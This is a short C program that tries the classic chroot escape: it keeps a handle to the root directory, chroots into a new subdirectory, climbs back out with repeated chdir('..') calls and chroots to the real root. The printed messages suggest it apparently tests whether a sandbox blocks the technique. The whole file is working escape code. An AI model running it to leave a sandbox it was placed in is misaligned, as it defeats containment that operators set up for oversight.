#include <stdio.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <string.h>

int main() {
    printf("Attempting chroot escape...\n");
    
    // Classic chroot escape technique
    mkdir(".out", 0755);
    int root = open("/", O_RDONLY);
    
    if (root < 0) {
        printf("Cannot open root: %s\n", strerror(errno));
        return 1;
    }
    
    if (chroot(".out") < 0) {
        printf("Chroot BLOCKED: %s\n", strerror(errno));
        close(root);
        return 1;
    }
    
    fchdir(root);
    close(root);
    
    for (int i = 0; i < 100; i++) {
        chdir("..");
    }
    
    if (chroot(".") < 0) {
        printf("Final chroot BLOCKED: %s\n", strerror(errno));
        return 1;
    }
    
    printf("CRITICAL: Chroot escape may have succeeded!\n");
    return 0;
}
